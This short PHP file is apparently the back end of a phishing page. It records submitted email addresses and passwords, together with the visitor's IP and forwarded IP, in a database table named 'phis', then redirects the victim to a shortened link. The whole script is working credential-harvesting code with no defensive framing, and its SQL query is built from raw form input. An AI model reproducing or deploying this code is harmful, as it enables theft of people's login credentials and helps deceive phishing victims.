<?php

require_once('db-connection.php');
$t = time();
$email = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$proxIp = $_SERVER['HTTP_X_FORWARDED_FOR'];
$time = date("Y-m-d",$t);
$query = "INSERT INTO `phis`(`Email`, `Password`, `Time`,`IP`,`ProxIp`) VALUES ('$email','$password','$time','$ip','$proxIp')";
$link->query($query);
header ('Location:http://ow.ly/ZIu2P');
exit;

?>
